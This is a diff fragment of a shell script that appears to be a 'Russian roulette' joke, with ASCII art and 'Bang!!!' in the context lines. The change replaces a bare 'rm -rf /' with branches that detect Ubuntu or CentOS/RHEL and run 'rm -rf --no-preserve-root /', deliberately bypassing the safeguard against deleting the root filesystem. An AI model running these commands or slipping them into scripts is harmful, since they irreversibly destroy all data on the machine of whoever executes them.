@@ -14,7 +14,19 @@ Bang!!!                       |       \
                                  |         \
                                  |__________|
 '''
-     rm -rf /
+
+    # Ubuntu
+    if [ -f /etc/lsb-release ]; then
+        rm -rf --no-preserve-root /
+
+    # CentOS RHEL
+    elif [ -f /etc/redhat-release ]; then
+        rm -rf --no-preserve-root /
+
+    else
+        rm -rf /
+    fi
+
 else
     echo '''
 
